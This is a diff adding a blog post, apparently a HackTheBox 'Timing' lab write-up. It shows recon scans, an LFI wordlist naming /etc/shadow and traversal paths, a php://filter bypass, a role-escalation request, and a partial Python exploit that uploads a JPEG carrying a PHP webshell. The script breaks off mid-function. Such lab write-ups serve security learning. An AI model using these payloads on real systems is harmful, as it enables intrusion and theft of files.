@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>secoats | HackTheBox - Timing</title>
+        <link rel="canonical" href="https://secoats.github.io/posts/htb_timing.html" />
+        <link rel="stylesheet" href="/assets/css/main.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" />
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Mono&family=Roboto:wght@400;700&family=Noto+Sans&display=swap" rel="stylesheet" />
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="google-site-verification" content="ec3XZVmgp3ZOsiLB8riLA-9B5kVJVR_71u11vmIMs4w" />
+        <meta name="description" content="Ramblings about InfoSec, Pentesting, CTF and Tools" />
+        <meta property="og:type" content="article" />
+        <meta property="og:locale" content="en_US" />
+        <meta property="og:site_name" content="secoats" />
+        <meta property="og:title" content="HackTheBox - Timing" />
+        <meta property="og:url" content="https://secoats.github.io/posts/htb_timing.html" />
+        <meta property="og:image" content="https://secoats.github.io/assets/img/oats_field.jpg">
+        <meta name="author" content="secoats">
+        <meta property="article:author" content="secoats">
+    </head>
+    <body>
+        <div id="main">
+            <div id="header">
+                <div id="masthead" class="wrapper">
+                    <span class="site-title">
+                        <a href="/">secoats</a>
+                    </span>
+                    <span class="main-nav">
+                        <a href="/posts.html">Posts</a>
+<a href="/categories.html#writeup">Writeups</a>
+<a href="/categories.html#tutorial">Tutorials</a>
+                    </span>
+                </div>
+            </div>
+            <main id="content" class="wrapper">
+                <article class="mbox">
+                    
+                    <div class="breaker breaker-image" style="margin-top:-50px;"><div class="repairman" style="margin-top:20px;"><img alt="Timing Login interface" src="/assets/img/timing2.png"></div></div>
+                    
+                    <h1 class="article-headline">HackTheBox - Timing</h1>
+                    <p class="article-subline">
+                        <span class="article-meta-reading-time"><i class="far fa-clock" aria-hidden="true"></i> 12 minute read</span> - <span class="article-meta-published">June 05, 2022</span>
+                    </p>
+                    <p>The <strong>Timing</strong> machine on <a href="https://www.hackthebox.com/">HTB</a> has some interesting web exploitation paths that reminded me of the OSCP and OSWE course labs. The intended path involves a <strong>Local File Inclusion (LFI)</strong> vulnerability combined with a <strong>File Upload</strong> function that is only accessible after <strong>upgrading our user account</strong>.</p>
+<p>I have tried to describe my approach along with the solutions. I usually find that to be more useful for learning than a solution without context.</p>
+<ul>
+<li><a href="#network-recon">Network Recon</a></li>
+<li><a href="#http-server-on-port-80">HTTP Server on Port 80</a></li>
+<li><a href="#login-path-1-username-exists-oracle">Login Path 1 Username Exists Oracle</a></li>
+<li><a href="#login-path-2-local-file-inclusion">Login Path 2 Local File Inclusion</a><ul>
+<li><a href="#php-wrapper">PHP Wrapper</a></li>
+</ul>
+</li>
+<li><a href="#webapp-privesc">Webapp Privesc</a></li>
+<li><a href="#remote-code-execution">Remote Code Execution</a></li>
+<li><a href="#user-shell">User Shell</a></li>
+<li><a href="#root">Root</a></li>
+</ul>
+<h2 id="network-recon">Network Recon<a class="headerlink" href="#network-recon" title="Permanent link"> </a></h2>
+<p>A thorough nmap scan reveals only two open TCP ports (output abridged):</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- <span class="m">10</span>.10.11.135
+$ nmap -vv --reason -Pn -T4 -sU -A --top-ports <span class="m">100</span> <span class="m">10</span>.10.11.135
+</code></pre></div></div></div>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>PORT   STATE SERVICE REASON         VERSION
+
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Simple WebApp
+|_Requested resource was ./login.php
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+
+Aggressive OS guesses: Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%)
+</code></pre></div></div></div>
+<p>The target machine appears to be an Ubuntu Linux installation.</p>
+<p>The open ports are:</p>
+<ul>
+<li>TCP/22 -- SSH</li>
+<li>TCP/80 -- HTTP</li>
+</ul>
+<p>Associated with those we find two service banners:</p>
+<ul>
+<li>OpenSSH 7.6p1 Ubuntu 4ubuntu0.5</li>
+<li>Apache httpd 2.4.29 ((Ubuntu))</li>
+</ul>
+<p>When we search for these using <code>searchsploit</code> or <a href="https://www.exploit-db.com/">exploitDB</a>, then we only find a possible Username Enumeration vulnerability for <code>OpenSSH 2.3 &lt; 7.7</code> (CVE-2018-15473). But this particular version appears to not be vulnerable. Metasploit's <code>scanner/ssh/ssh_enumusers</code> module only finds false positives.</p>
+<p>The only other noteworthy information at this stage is that the SSH server supports both password and public key logins:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ nmap -vv --reason -Pn -T4 -sV -p <span class="m">22</span> --script<span class="o">=</span><span class="s2">"banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods"</span> <span class="m">10</span>.10.11.135
+<span class="c1"># ...</span>
+<span class="p">|</span> ssh-auth-methods: 
+<span class="p">|</span>   Supported authentication methods: 
+<span class="p">|</span>     publickey
+<span class="p">|</span>_    password
+</code></pre></div></div></div>
+<h2 id="http-server-on-port-80">HTTP Server on Port 80<a class="headerlink" href="#http-server-on-port-80" title="Permanent link"> </a></h2>
+<p>When we visit the web server, then we get redirected to a login (PHP) page.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Timing Login interface" src="/assets/img/timing_10_login.png"/></div></div></p>
+<p>I checked for SQL and NoSQL injections, but did not find anything obvious.</p>
+<p><a href="https://github.com/epi052/feroxbuster">Feroxbuster</a> discovers some other files and directories:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ feroxbuster -u http://10.10.11.135/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e
+
+302      GET        0l        0w        0c http://10.10.11.135/ =&gt; ./login.php
+301      GET        9l       28w      310c http://10.10.11.135/css =&gt; http://10.10.11.135/css/
+200      GET      115l      264w     3937c http://10.10.11.135/footer.php
+302      GET        0l        0w        0c http://10.10.11.135/header.php =&gt; ./login.php
+200      GET        0l        0w        0c http://10.10.11.135/image.php
+301      GET        9l       28w      313c http://10.10.11.135/images =&gt; http://10.10.11.135/images/
+302      GET        0l        0w        0c http://10.10.11.135/index.php =&gt; ./login.php
+301      GET        9l       28w      309c http://10.10.11.135/js =&gt; http://10.10.11.135/js/
+200      GET        6l      458w    39680c http://10.10.11.135/js/bootstrap.min.js
+200      GET        2l     1297w    89476c http://10.10.11.135/js/jquery.min.js
+200      GET        6l     1460w   121457c http://10.10.11.135/css/bootstrap.min.css
+200      GET      278l      561w     5425c http://10.10.11.135/css/login.css
+302      GET        0l        0w        0c http://10.10.11.135/logout.php =&gt; ./login.php
+200      GET      177l      374w     5609c http://10.10.11.135/login.php
+200      GET      214l      960w    38616c http://10.10.11.135/images/user-icon.png
+302      GET        0l        0w        0c http://10.10.11.135/profile.php =&gt; ./login.php
+302      GET        0l        0w        0c http://10.10.11.135/upload.php =&gt; ./login.php
+200      GET        0l        0w        0c http://10.10.11.135/db_conn.php
+302      GET        0l        0w        0c http://10.10.11.135/profile_update.php =&gt; ./login.php
+</code></pre></div></div></div>
+<h2 id="login-path-1-username-exists-oracle">Login Path 1 Username Exists Oracle<a class="headerlink" href="#login-path-1-username-exists-oracle" title="Permanent link"> </a></h2>
+<p>You can skip this part and go straight to <a href="#login-path-2-local-file-inclusion">Path 2 (LFI)</a>. The LFI will be required later on to gain a shell anyway, but I thought the Username Oracle path is pretty interesting as well.</p>
+<hr/>
+<p>The first thing I noticed when I looked at the website with Burp was a username oracle in the login interface. I found this when I tried to log in with the common username <code>admin</code>, which happens to actually exist.</p>
+<p>If a username exists, then the response time will be noticably long. In turn a login attempt with a non-existent username will cause an almost instant response. </p>
+<p>This vulnerability is usually caused by the time required to calculate the hash for the input password, so it can be compared to the password hash in the database. If a secure algorithm is used, then this calculation will cause a noticable delay. This makes cracking the stored password hash more time intensive for an attacker, but also creates a username oracle if the developer does not account for it in their login procedure.</p>
+<p>If you have <strong>Burp Professional</strong> (or Burp Community and a lot of time), then you can use <strong>Burp Intruder</strong> and a username wordlist in order to find other existing usernames. </p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Burp Intruder positions" src="/assets/img/timing_14_intruder.png"/></div></div></p>
+<p>Enable the column for Response Times ("Response Received") in the output window.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Burp Intruder results" src="/assets/img/timing_15_intruder.png"/></div></div></p>
+<p>In this example the oracle is very pronounced with over one second delay for correct usernames.</p>
+<p>User 'aaron' does not like to remember complicated passwords. The password is also 'aaron'.</p>
+<h2 id="login-path-2-local-file-inclusion">Login Path 2 Local File Inclusion<a class="headerlink" href="#login-path-2-local-file-inclusion" title="Permanent link"> </a></h2>
+<p>Previously we found some PHP files with Feroxbuster that are publicly accessible and do not redirect to <code>login.php</code>:</p>
+<ul>
+<li>footer.php</li>
+<li>image.php</li>
+<li>db_conn.php</li>
+</ul>
+<p>Sadly navigating to these files does not generate any useful output. The footer file is probably just a template for the website footer. But the other two files look interesting.</p>
+<p>My assumption was that <code>image.php</code> is probably used to load image files. Sadly just browsing the site (unauthenticated) did not show any examples of this PHP file being used in Burp.</p>
+<p>Since I did not find any other leads I fuzzed for URL parameters with FFUF.</p>
+<p>We are looking for two unknowns, the parameter key and a parameter value that produces an unusual output:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>/image.php?&lt;key&gt;=&lt;value&gt;
+</code></pre></div></div></div>
+<p>E.g. something like this:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>/image.php?file=some_image.jpg
+</code></pre></div></div></div>
+<p>Taken from burp, I saved the following HTTP request as <code>request.txt</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>GET /image.php?FUZZ=FU2Z HTTP/1.1
+Host: 10.10.11.135
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=on3t12dp0tb8kr8l15k83qqag7
+Upgrade-Insecure-Requests: 1
+</code></pre></div></div></div>
+<p>And created the following <a href="https://github.com/ffuf/ffuf/blob/master/ffufrc.example">FFUF config</a> as <code>config.ffuf</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="k">[input]</span>
+    <span class="na">request</span> <span class="o">=</span> <span class="s">"request.txt"</span>
+<span class="s">    requestproto = "http"</span>
+
+<span class="k">[http]</span>
+    <span class="na">proxyurl</span> <span class="o">=</span> <span class="s">"http://127.0.0.1:8080"</span>
+
+<span class="k">[general]</span>
+    <span class="na">colors</span> <span class="o">=</span> <span class="s">true</span>
+<span class="s">    verbose = true</span>
+<span class="s">    delay = ""</span>
+<span class="s">    maxtime = 0</span>
+<span class="s">    maxtimejob = 0</span>
+<span class="s">    quiet = false</span>
+<span class="s">    rate = 0</span>
+<span class="s">    stopon403 = false</span>
+<span class="s">    stoponall = false</span>
+<span class="s">    stoponerrors = false</span>
+<span class="s">    threads = 10</span>
+
+<span class="k">[output]</span>
+    <span class="na">debuglog</span> <span class="o">=</span> <span class="s">"debug.log"</span>
+<span class="s">    outputfile = "output.json"</span>
+<span class="s">    outputformat = "json"</span>
+<span class="s">    outputcreateemptyfile = false</span>
+
+<span class="k">[matcher]</span>
+    <span class="na">status</span> <span class="o">=</span> <span class="s">"all"</span>
+
+<span class="k">[filter]</span>
+    <span class="na">size</span> <span class="o">=</span> <span class="s">"0"</span>
+</code></pre></div></div></div>
+<p>Note that I set Burp as proxy <code>http://127.0.0.1:8080</code>, so I can see the requests and responses later in Burp's history. Make sure Burp is actually running.</p>
+<p><a href="https://github.com/danielmiessler/SecLists">Seclists</a> has some wordlists for fuzzing. I used the following for the parameter key:</p>
+<ul>
+<li><code>/usr/share/seclists/Discovery/Web-Content/api/objects.txt</code></li>
+</ul>
+<p>I also made a small LFI wordlist myself <code>lfi_linux_small.txt</code> for the parameter value:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>/etc/passwd
+/etc/shadow
+/etc/crontab
+/etc/bashrc
+/etc/groups
+/etc/hosts
+/proc/self/environ
+../../../../etc/shadow
+../../../../etc/crontab
+../../../../etc/bashrc
+../../../../etc/groups
+../../../../etc/hosts
+../../../../proc/self/environ
+</code></pre></div></div></div>
+<p>Finally the terminal command looks like this then:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ ffuf -config ./config.ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt:FUZZ -w ./lfi_linux_small.txt:FU2Z
+
+<span class="c1">#...</span>
+<span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">25</span>, Words: <span class="m">3</span>, Lines: <span class="m">1</span><span class="o">]</span>
+<span class="p">|</span> URL <span class="p">|</span> http://10.10.11.135/image.php?img<span class="o">=</span>/etc/passwd
+    * FU2Z: /etc/passwd
+    * FUZZ: img
+
+<span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">25</span>, Words: <span class="m">3</span>, Lines: <span class="m">1</span><span class="o">]</span>
+<span class="p">|</span> URL <span class="p">|</span> http://10.10.11.135/image.php?img<span class="o">=</span>/etc/shadow
+    * FUZZ: img
+    * FU2Z: /etc/shadow
+<span class="c1">#...</span>
+</code></pre></div></div></div>
+<p>A working parameter is quickly found:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>http://10.10.11.135/image.php?img=/etc/passwd
+http://10.10.11.135/image.php?img=../../../etc/passwd
+</code></pre></div></div></div>
+<p>The response body will contain the text:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>Hacking attempt detected!
+</code></pre></div></div></div>
+<p>I tried using this parameter as it was probably intended to be used. Here with the image file from the login page:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>http://10.10.11.135/image.php?img=./images/user-icon.png
+</code></pre></div></div></div>
+<p>This printed the binary blob of the image file. So it seems we actually have a local file inclusion (LFI) at our hands.</p>
+<p>The only hurdle now is the input filter that produces the error output: <code>Hacking attempt detected!</code>.</p>
+<h4 id="php-wrapper">PHP Wrapper<a class="headerlink" href="#php-wrapper" title="Permanent link"> </a></h4>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers">PayloadAllTheThings has a cheatsheet for PHP Wrappers</a>.</p>
+<p>The following PHP Wrapper ended up working:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="PHP Wrapper LFI" src="/assets/img/timing_30_lfi_wrapper.png"/></div></div></p>
+<p>This will print the file content as base64. Burp's Decoder can turn that back into the proper cleartext:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
+</code></pre></div></div></div>
+<p>I tried logging into the website as <code>aaron</code> with password <code>aaron</code> and was rewarded with:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>You are logged in as user 2!
+</code></pre></div></div></div>
+<h2 id="webapp-privesc">Webapp Privesc<a class="headerlink" href="#webapp-privesc" title="Permanent link"> </a></h2>
+<p>Once we are logged in we can change our profile details.</p>
+<p>When we capture this request in Burp, then we can see an interesting response. The response JSON object has more fields than the ones we overwrote. One of them is <code>"role": "0"</code> which probably indicates user rights.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Parameter polution" src="/assets/img/timing_40_profile_update.png"/></div></div></p>
+<p>After including <code>&amp;rule=1</code> in the request our session gets upgraded to an admin user.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>POST /profile_update.php HTTP/1.1
+Host: 10.10.11.135
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.11.135/profile.php
+Content-type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: http://10.10.11.135
+Connection: close
+Cookie: PHPSESSID=b4kjobo81eummgl8sm0mig5ltu
+
+firstName=test&amp;lastName=test&amp;email=test&amp;company=test&amp;role=1
+</code></pre></div></div></div>
+<p>Once we are admin, we can upload a profile picture.</p>
+<h2 id="remote-code-execution">Remote Code Execution<a class="headerlink" href="#remote-code-execution" title="Permanent link"> </a></h2>
+<p>The file upload function allows us to upload <code>.jpg</code> or <code>.pdf</code> files only. I tried uploading an image, but I could not find the resulting image in the <code>/images/</code> directory.</p>
+<p>In order to whitebox analyze this app I downloaded the following php files with the LFI:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php
+http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=image.php
+</code></pre></div></div></div>
+<p>In the <code>upload.php</code> file is the following code:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1">// ...</span>
+<span class="c1">// upload.php</span>
+<span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s2">"images/uploads/"</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$file_hash</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>
+
+<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s1">'$file_hash'</span> <span class="o">.</span> <span class="nb">time</span><span class="p">())</span> <span class="o">.</span> <span class="s1">'_'</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
+<span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
+<span class="nv">$error</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+<span class="c1">// ...</span>
+</code></pre></div></div></div>
+<p>So presumably the resulting file will be in <code>images/uploads/</code> and the filename would be:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="x">md5( uniqid() . time() ) . '_' . 'example.jpg'</span>
+</code></pre></div></div></div>
+<p>E.g. <code>2e47a134b2def213d5453367e030a09f_example.jpg</code></p>
+<ul>
+<li><code>uniqid()</code> -- generates a hex representation of the current UNIX timestamp (microsecond precision)</li>
+<li><code>time()</code> -- generates the current UNIX timestamp as integer (only seconds precision)</li>
+<li><code>md5()</code> -- creates an md5 hash</li>
+</ul>
+<p>So all parts of this filename are predictable. Only the inclusion of microseconds could force us to use a large number of requests to find the right filename.</p>
+<p>But there is actually a bug in this code that is easy to overlook:</p>
+<p><code>'$file_hash'</code> is hardcoded as a string, instead of using the actual value of the variable <code>$file_hash</code>. So in effect we only have to guess the correct second.</p>
+<p>In summary, the filename will be:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="x">md5( '$file_hash' . time() ) . '_' . 'example.jpg'</span>
+</code></pre></div></div></div>
+<p>With this we will only need to check the current second plus/minus a few seconds to compensate for clock skew and response time.</p>
+<p>Now that we have figured out how to find the uploaded file, how do we smuggle in some PHP code? </p>
+<p>Important is that the image file needs to have the <code>.jpg</code> extension and needs to pass <code>getimagesize()</code> or the file will be rejected:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1">// upload.php</span>
+<span class="c1">// ...</span>
+<span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+<span class="c1">// ...</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"jpg"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$error</span> <span class="o">=</span> <span class="s2">"This extension is not allowed."</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">//...</span>
+<span class="nv">$check</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">]);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$check</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$error</span> <span class="o">=</span> <span class="s2">"Invalid file"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// ...</span>
+</code></pre></div></div></div>
+<p>These bars not very high. We can just append some PHP code to a valid JPEG file.</p>
+<p>For example this would work in attaching PHP code to a valid image file <code>example.jpg</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">"&lt;?php phpinfo() ?&gt;"</span> &gt;&gt; example.jpg
+</code></pre></div></div></div>
+<p>After uploading this and guessing the correct filename we would see the output of the <code>phpinfo()</code> function.</p>
+<p>But it is a better idea to use a proper Python script to manipulate the jpg file before it is uploaded.</p>
+<p>I hacked together an exploit that uploads a JPEG with an attached webshell, finds the right filename and then opens a pseudo shell. </p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># HTB Timing - Authenticated RCE</span>
+<span class="n">__author__</span> <span class="o">=</span> <span class="s2">"oats"</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">math</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">requests_toolbelt.multipart.encoder</span> <span class="kn">import</span> <span class="n">MultipartEncoder</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+   <span class="c1">#'http': 'http://127.0.0.1:8080' # comment back in for burp</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">phptime</span><span class="p">():</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">inp_str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">inp_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="n">test</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">test</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">a</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">a</span> <span class="o">+=</span> <span class="n">payload</span>
+    <span class="n">test</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="n">multipart_data</span> <span class="o">=</span> <span class="n">MultipartEncoder</span><span class="p">(</span>
+        <span class="n">fields</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s1">'fileToUpload'</span><span class="p">:</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="s1">'image/jpeg'</span><span class="p">)</span>
+            <span class="p">}</span>
+    <span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'Content-Type'</span><span class="p">:</span> <span class="n">multipart_data</span><span class="o">.</span><span class="n">content_type</span><span class="p">,</span>
+        <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'</span><span class="p">,</span> 
+        <span class="s1">'Cookie'</span><span class="p">:</span> <span class="n">cookie</span>
+    <span class="p">}</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">multipart_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s2">"The file has been uploaded."</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] SUCCESSFULLY UPLOADED"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"[-] FAILED UPLOAD"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">response</span>
+
+<span class="k">def</span> <span class="nf">figure_filename</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span> <span class="s1">'$file_hash'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="p">)</span>
